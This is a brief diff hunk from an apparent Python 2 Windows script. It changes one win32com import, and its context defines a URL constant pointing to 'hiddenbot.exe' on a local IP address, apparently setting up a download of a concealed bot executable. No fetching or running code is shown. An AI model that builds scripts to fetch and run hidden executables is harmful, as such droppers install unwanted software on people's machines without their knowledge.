@@ -3,7 +3,7 @@ import urllib2
 import win32api
 import win32con
 
-from win32com.shell import shell
+from win32com.shell import shell, shellcon
 
 global chatboturl
 CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
